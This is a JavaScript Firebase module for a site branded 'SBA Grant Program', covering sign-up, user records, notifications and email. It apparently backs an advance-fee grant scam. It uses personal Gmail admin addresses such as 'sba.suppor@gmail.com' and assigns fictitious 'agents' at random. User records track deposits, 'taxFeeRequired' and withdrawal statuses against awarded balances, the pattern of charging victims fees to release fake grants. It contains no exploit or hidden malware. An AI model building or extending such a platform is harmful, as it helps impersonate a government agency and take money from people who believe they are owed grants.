import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { 
    getAuth, onAuthStateChanged, signOut, 
    createUserWithEmailAndPassword, signInWithEmailAndPassword,
    sendEmailVerification, sendPasswordResetEmail,
    updatePassword, reauthenticateWithCredential, EmailAuthProvider,
    browserLocalPersistence, setPersistence, updateProfile
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import { 
    getFirestore, doc, getDoc, getDocs, setDoc, updateDoc, addDoc, deleteDoc,
    collection, query, where, orderBy, limit, onSnapshot, 
    serverTimestamp, increment, arrayUnion, writeBatch 
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import { 
    getMessaging, getToken, onMessage 
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging.js";

const firebaseConfig = {
    apiKey: "AIzaSyBB3VE9WQYX0fqM9ZmLSj3dR0-SQjpg0gY",
    authDomain: "sbagrant-b7e5d.firebaseapp.com",
    projectId: "sbagrant-b7e5d",
    storageBucket: "sbagrant-b7e5d.firebasestorage.app",
    messagingSenderId: "802243206422",
    appId: "1:802243206422:web:bbe74af7ce227092250437"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
let messaging = null;

// Only initialize messaging if supported in environment
try {
    messaging = getMessaging(app);
} catch (e) {
    console.warn("Firebase Messaging not supported in this browser environment.");
}

// Set persistence to local
setPersistence(auth, browserLocalPersistence);

// Admin Configuration
export const ADMIN_EMAILS = ['sba.suppor@gmail.com', 'liger4683@gmail.com'];
export const AGENTS = ['Sarah Mitchell', 'James Caldwell', 'Diana Torres', 'Robert Hughes', 'Patricia Wells', 'Michael Chen', 'Angela Davis', 'Thomas Brown'];

// Helpers
export const isAdmin = (email) => ADMIN_EMAILS.includes(email?.toLowerCase());
export const getRandomAgent = () => AGENTS[Math.floor(Math.random() * AGENTS.length)];

/**
 * Compresses an image file and returns a Base64 string
 */
export async function compressToBase64(file, maxWidth = 800, quality = 0.78) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (event) => {
            const img = new Image();
            img.src = event.target.result;
            img.onload = () => {
                const canvas = document.createElement('canvas');
                let width = img.width;
                let height = img.height;

                if (width > maxWidth) {
                    height = (maxWidth / width) * height;
                    width = maxWidth;
                }

                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0, width, height);
                resolve(canvas.toDataURL('image/jpeg', quality));
            };
        };
        reader.onerror = (error) => reject(error);
    });
}

/**
 * Builds the comprehensive user object for Firestore
 */
export function buildNewUserPayload(data) {
    const email = data.email.toLowerCase();
    const role = isAdmin(email) ? 'admin' : 'user';
    
    return {
        uid: data.uid,
        fullName: data.fullName,
        email: email,
        username: data.username || email.split('@')[0],
        phoneNumber: data.phoneNumber || '',
        country: data.country || '',
        gender: data.gender || '',
        dob: data.dob || '',
        avatarBase64: '',
        role: role,
        referredBy: data.referredBy || '',
        allocatedProgram: "SBA Grant Program",
        assignedAgent: getRandomAgent(),
        
        kycStatus: "IDLE",
        applyStatus: "IDLE",
        depositStatus: "IDLE",
        taxStatus: "IDLE",
        withdrawStatus: "IDLE",
        awardStatus: "IDLE",
        
        balance: 0,
        requestedAmount: 0,
        totalAward: 0,
        taxFeeRequired: 0,
        
        application: {},
        kyc: {},
        deposit: {},
        tax: {},
        withdrawal: {},
        
        transactionPin: "",
        accountStatus: "active",
        fcmToken: "",
        emailNotifications: true,
        pushNotifications: true,
        isOnline: true,
        lastSeen: serverTimestamp(),
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp()
    };
}

// Firestore Wrappers
export const getUserData = async (uid) => {
    const docRef = doc(db, "users", uid);
    const docSnap = await getDoc(docRef);
    return docSnap.exists() ? docSnap.data() : null;
};

export const listenUserData = (uid, callback) => {
    return onSnapshot(doc(db, "users", uid), (doc) => {
        callback(doc.exists() ? doc.data() : null);
    });
};

export const updateUserData = async (uid, fields) => {
    const docRef = doc(db, "users", uid);
    return await updateDoc(docRef, {
        ...fields,
        updatedAt: serverTimestamp()
    });
};

export const setUserOnline = async (uid, status) => {
    if (!uid) return;
    return await updateDoc(doc(db, "users", uid), {
        isOnline: status,
        lastSeen: serverTimestamp()
    });
};

export const addLedgerEntry = async (uid, { type, amount, description, status, ref = "" }) => {
    const ledgerRef = collection(db, "users", uid, "ledger");
    return await addDoc(ledgerRef, {
        type, amount, description, status, ref,
        createdAt: serverTimestamp()
    });
};

export const logAdminAction = async (adminUid, adminEmail, action, targetUid, details = {}) => {
    return await addDoc(collection(db, "auditLog"), {
        adminUid, adminEmail, action, targetUid, details,
        timestamp: serverTimestamp()
    });
};

export const notify = async (uid, { title, message, type = 'info', link = '', sendEmail = false }) => {
    const notifRef = collection(db, "notifications");
    await addDoc(notifRef, {
        uid, title, message, type, link,
        read: false,
        createdAt: serverTimestamp()
    });
    
    if (sendEmail) {
        const userData = await getUserData(uid);
        if (userData && userData.emailNotifications) {
            sendEmailNotification({
                toEmail: userData.email,
                toName: userData.fullName,
                subject: title,
                message: message,
                actionUrl: window.location.origin + '/' + link
            });
        }
    }
};

export const notifyAdmins = async ({ title, message, type = 'action', link = 'admin-portal.html' }) => {
    const q = query(collection(db, "users"), where("role", "==", "admin"));
    const querySnapshot = await getDocs(q);
    querySnapshot.forEach((adminDoc) => {
        notify(adminDoc.id, { title, message, type, link });
    });
};

export const markNotificationRead = async (notifId) => {
    return await updateDoc(doc(db, "notifications", notifId), { read: true });
};

export const markAllRead = async (uid) => {
    const q = query(collection(db, "notifications"), where("uid", "==", uid), where("read", "==", false));
    const querySnapshot = await getDocs(q);
    const batch = writeBatch(db);
    querySnapshot.forEach((d) => batch.update(d.ref, { read: true }));
    return await batch.commit();
};

export const requestNotificationPermission = async (uid) => {
    if (!messaging) return;
    try {
        const permission = await Notification.requestPermission();
        if (permission === 'granted') {
            const token = await getToken(messaging, { 
                vapidKey: 'REPLACE_WITH_YOUR_VAPID_KEY' // REPLACE WITH REAL VAPID KEY
            });
            if (token) await updateUserData(uid, { fcmToken: token });
        }
    } catch (err) {
        console.error("Token request failed", err);
    }
};

export const initForegroundMessages = (onReceive) => {
    if (messaging) onMessage(messaging, (payload) => onReceive(payload));
};

// Registration Session Helpers
export const saveRegStep = (data) => {
    const current = JSON.parse(sessionStorage.getItem('SBA_REG') || '{}');
    sessionStorage.setItem('SBA_REG', JSON.stringify({ ...current, ...data }));
};
export const getRegData = () => JSON.parse(sessionStorage.getItem('SBA_REG') || '{}');
export const clearRegData = () => sessionStorage.removeItem('SBA_REG');

// EmailJS Service
export const sendEmailNotification = async ({ toEmail, toName, subject, message, actionUrl }) => {
    const SERVICE_ID = "REPLACE_WITH_YOUR_EMAILJS_SERVICE_ID";
    const TEMPLATE_ID = "REPLACE_WITH_YOUR_EMAILJS_TEMPLATE_ID";
    const PUBLIC_KEY = "REPLACE_WITH_YOUR_EMAILJS_PUBLIC_KEY";

    try {
        // Implementation using native fetch for EmailJS API to keep bundle small
        await fetch('https://api.emailjs.com/api/v1.0/email/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                service_id: SERVICE_ID,
                template_id: TEMPLATE_ID,
                user_id: PUBLIC_KEY,
                template_params: {
                    to_email: toEmail,
                    to_name: toName,
                    subject: subject,
                    message: message,
                    action_url: actionUrl
                }
            })
        });
    } catch (e) {
        console.error("Email failed to send", e);
    }
};

export { 
    auth, db, messaging, 
    onAuthStateChanged, signOut, createUserWithEmailAndPassword, signInWithEmailAndPassword,
    sendEmailVerification, sendPasswordResetEmail, updatePassword, reauthenticateWithCredential,
    EmailAuthProvider, doc, getDoc, setDoc, updateDoc, collection, serverTimestamp, 
    increment, query, where, orderBy, onSnapshot, updateProfile
};
